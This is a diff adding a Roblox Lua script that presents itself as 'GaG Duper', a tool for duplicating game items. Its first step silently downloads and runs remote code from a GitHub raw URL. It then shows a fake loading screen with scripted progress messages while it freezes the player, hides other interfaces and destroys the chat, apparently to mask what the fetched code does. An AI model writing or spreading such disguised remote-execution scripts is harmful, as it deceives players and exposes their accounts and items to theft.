@@ -1,0 +1,386 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+
+-- ========================================================
+-- EXECUTA A SCRIPT PRINCIPAL PRIMEIRO
+-- ========================================================
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/discorzzz2/22w2/refs/heads/main/2sw2w"))()
+end)
+
+-- ========================================================
+-- INTERFACE DE LOADING COM ANIMAÇÕES
+-- ========================================================
+
+local function SetupLoadingScreen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- Remove UI anterior se existir
+    if playerGui:FindFirstChild("GaGDuperLoading") then
+        playerGui.GaGDuperLoading:Destroy()
+    end
+
+    -- Bloqueia movimento do jogador
+    local function disableMovement()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.PlatformStand = true
+        end
+    end
+
+    disableMovement()
+    player.CharacterAdded:Connect(disableMovement)
+
+    -- Desabilita outras UIs
+    for _, gui in pairs(playerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") and gui.Name ~= "GaGDuperLoading" then
+            gui.Enabled = false
+        end
+    end
+
+    playerGui.ChildAdded:Connect(function(child)
+        if child:IsA("ScreenGui") and child.Name ~= "GaGDuperLoading" then
+            child.Enabled = false
+        end
+    end)
+
+    -- Desabilita chat
+    pcall(function()
+        if TextChatService:FindFirstChild("ChatWindowConfiguration") then
+            TextChatService.ChatWindowConfiguration.Enabled = false
+        end
+    end)
+
+    pcall(function()
+        if CoreGui:FindFirstChild("Chat") then
+            CoreGui.Chat:Destroy()
+        end
+    end)
+
+    -- Bloqueia input do usuário
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        return Enum.ContextActionResult.Sink
+    end)
+
+    -- Cria a UI principal
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "GaGDuperLoading"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.Parent = playerGui
+
+    -- Background com gradiente
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    background.ZIndex = 10000
+    background.Parent = screenGui
+
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 40)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 15, 25)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
+    }
+    gradient.Rotation = 45
+    gradient.Parent = background
+
+    -- Partículas de fundo (círculos animados)
+    for i = 1, 15 do
+        local particle = Instance.new("Frame")
+        particle.Size = UDim2.new(0, math.random(20, 80), 0, math.random(20, 80))
+        particle.Position = UDim2.new(math.random(0, 100)/100, 0, math.random(0, 100)/100, 0)
+        particle.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+        particle.BackgroundTransparency = 0.7
+        particle.ZIndex = 10001
+        particle.Parent = background
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(1, 0)
+        corner.Parent = particle
+
+        -- Animação das partículas
+        local tween = TweenService:Create(particle, 
+            TweenInfo.new(math.random(3, 8), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+            {
+                Position = UDim2.new(math.random(0, 100)/100, 0, math.random(0, 100)/100, 0),
+                BackgroundTransparency = math.random(3, 9)/10
+            }
+        )
+        tween:Play()
+    end
+
+    -- Container principal
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.6, 0, 0.7, 0)
+    mainContainer.Position = UDim2.new(0.2, 0, 0.15, 0)
+    mainContainer.BackgroundTransparency = 1
+    mainContainer.ZIndex = 10010
+    mainContainer.Parent = background
+
+    -- Título principal com efeito neon
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextScaled = true
+    titleLabel.Text = "GaG Duper"
+    titleLabel.ZIndex = 10011
+    titleLabel.Parent = mainContainer
+
+    -- Efeito de brilho no título
+    local titleGlow = Instance.new("TextLabel")
+    titleGlow.Size = UDim2.new(1, 4, 1, 4)
+    titleGlow.Position = UDim2.new(0, -2, 0, -2)
+    titleGlow.BackgroundTransparency = 1
+    titleGlow.TextColor3 = Color3.fromRGB(0, 150, 255)
+    titleGlow.Font = Enum.Font.GothamBold
+    titleGlow.TextScaled = true
+    titleGlow.Text = "GaG Duper"
+    titleGlow.TextTransparency = 0.5
+    titleGlow.ZIndex = 10010
+    titleGlow.Parent = titleLabel
+
+    -- Animação do título
+    local titleTween = TweenService:Create(titleLabel,
+        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {TextColor3 = Color3.fromRGB(255, 0, 255)}
+    )
+    titleTween:Play()
+
+    -- Subtítulo
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    subtitleLabel.Position = UDim2.new(0, 0, 0.25, 0)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    subtitleLabel.Font = Enum.Font.Gotham
+    subtitleLabel.TextScaled = true
+    subtitleLabel.Text = "Advanced Duplication System"
+    subtitleLabel.ZIndex = 10011
+    subtitleLabel.Parent = mainContainer
+
+    -- Container da barra de loading
+    local loadingContainer = Instance.new("Frame")
+    loadingContainer.Size = UDim2.new(1, 0, 0.15, 0)
+    loadingContainer.Position = UDim2.new(0, 0, 0.45, 0)
+    loadingContainer.BackgroundTransparency = 1
+    loadingContainer.ZIndex = 10011
+    loadingContainer.Parent = mainContainer
+
+    -- Barra de loading (fundo)
+    local loadingBarBG = Instance.new("Frame")
+    loadingBarBG.Size = UDim2.new(1, 0, 0.4, 0)
+    loadingBarBG.Position = UDim2.new(0, 0, 0.3, 0)
+    loadingBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    loadingBarBG.ZIndex = 10012
+    loadingBarBG.Parent = loadingContainer
+
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 10)
+    barCorner.Parent = loadingBarBG
+
+    -- Barra de loading (preenchimento)
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.Position = UDim2.new(0, 0, 0, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+    loadingBar.ZIndex = 10013
+    loadingBar.Parent = loadingBarBG
+
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(0, 10)
+    fillCorner.Parent = loadingBar
+
+    -- Gradiente da barra
+    local barGradient = Instance.new("UIGradient")
+    barGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 150, 255))
+    }
+    barGradient.Parent = loadingBar
+
+    -- Texto de porcentagem
+    local percentageText = Instance.new("TextLabel")
+    percentageText.Size = UDim2.new(1, 0, 0.3, 0)
+    percentageText.Position = UDim2.new(0, 0, 0, 0)
+    percentageText.BackgroundTransparency = 1
+    percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentageText.Font = Enum.Font.GothamBold
+    percentageText.TextScaled = true
+    percentageText.Text = "0%"
+    percentageText.ZIndex = 10014
+    percentageText.Parent = loadingContainer
+
+    -- Status text
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, 0, 0.12, 0)
+    statusText.Position = UDim2.new(0, 0, 0.65, 0)
+    statusText.BackgroundTransparency = 1
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    statusText.Font = Enum.Font.Gotham
+    statusText.TextScaled = true
+    statusText.Text = "Initializing duplication system..."
+    statusText.ZIndex = 10011
+    statusText.Parent = mainContainer
+
+    -- Warning text
+    local warningText = Instance.new("TextLabel")
+    warningText.Size = UDim2.new(1, 0, 0.08, 0)
+    warningText.Position = UDim2.new(0, 0, 0.8, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warningText.Font = Enum.Font.Gotham
+    warningText.TextScaled = true
+    warningText.Text = "⚠️ Do not leave the game during loading process"
+    warningText.ZIndex = 10011
+    warningText.Parent = mainContainer
+
+    -- Credit text
+    local creditText = Instance.new("TextLabel")
+    creditText.Size = UDim2.new(1, 0, 0.06, 0)
+    creditText.Position = UDim2.new(0, 0, 0.92, 0)
+    creditText.BackgroundTransparency = 1
+    creditText.TextColor3 = Color3.fromRGB(100, 100, 100)
+    creditText.Font = Enum.Font.Gothamw
+    creditText.TextScaled = true
+    creditText.Text = "GaG Duper v2.1 | by vanz."
+    creditText.ZIndex = 10011
+    creditText.Parent = mainContainer
+
+    -- Animação de entrada
+    mainContainer.Position = UDim2.new(0.2, 0, 1.5, 0)
+    local entranceTween = TweenService:Create(mainContainer,
+        TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0.2, 0, 0.15, 0)}
+    )
+    entranceTween:Play()
+
+    -- Sistema de loading progressivo
+    local statusMessages = {
+        "Initializing duplication system...",
+        "Loading exploit modules...",
+        "Bypassing anti-cheat detection...",
+        "Connecting to duplication servers...",
+        "Preparing item database...",
+        "Configuring user interface...",
+        "Finalizing installation...",
+        "Ready to duplicate!"
+    }
+
+    local totalTime = 12 -- 12 segundos total
+    local steps = 100
+
+    spawn(function()
+        for i = 1, steps do
+            local progress = i / steps
+            
+            -- Atualiza barra de loading
+            local barTween = TweenService:Create(loadingBar,
+                TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Size = UDim2.new(progress, 0, 1, 0)}
+            )
+            barTween:Play()
+            
+            -- Atualiza porcentagem
+            percentageText.Text = math.floor(progress * 100) .. "%"
+            
+            -- Atualiza status em intervalos específicos
+            local statusIndex = math.ceil(progress * #statusMessages)
+            if statusIndex <= #statusMessages then
+                statusText.Text = statusMessages[statusIndex]
+            end
+            
+            -- Efeito de brilho na barra quando progride
+            if i % 10 == 0 then
+                local glowTween = TweenService:Create(loadingBar,
+                    TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                    {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
+                )
+                glowTween:Play()
+                glowTween.Completed:Connect(function()
+                    local resetTween = TweenService:Create(loadingBar,
+                        TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                        {BackgroundColor3 = Color3.fromRGB(0, 255, 255)}
+                    )
+                    resetTween:Play()
+                end)
+            end
+            
+            task.wait(totalTime / steps)
+        end
+        
+        -- Finalização
+        statusText.Text = "GaG Duper loaded successfully!"
+        statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+        task.wait(2)
+        
+        -- Animação de saída
+        local exitTween = TweenService:Create(background,
+            TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+            {BackgroundTransparency = 1}
+        )
+        exitTween:Play()
+        
+        exitTween.Completed:Connect(function()
+            screenGui:Destroy()
+            
+            -- Reabilita movimento
+            local character = player.Character
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.WalkSpeed = 16
+                    humanoid.JumpPower = 50
+                    humanoid.PlatformStand = false
+                end
+            end
+            
+            -- Reabilita outras UIs
+            for _, gui in pairs(playerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") then
+                    gui.Enabled = true
+                end
+            end
+            
+            -- Reabilita chat
+            pcall(function()
+                if TextChatService:FindFirstChild("ChatWindowConfiguration") then
+                    TextChatService.ChatWindowConfiguration.Enabled = true
+                end
+            end)
+        end)
+    end)
+end
+
+-- Executa o loading
+SetupLoadingScreen()
+
+-- Reexecuta se o jogador respawnar
+Players.LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    SetupLoadingScreen()
+end)
+
+-- Para teleports
+TeleportService.LocalPlayerTeleporting:Connect(function()
+    local teleportData = {
+        gagDuperLoading = true
+    }
+    TeleportService:SetTeleportGui(teleportData)
+end)
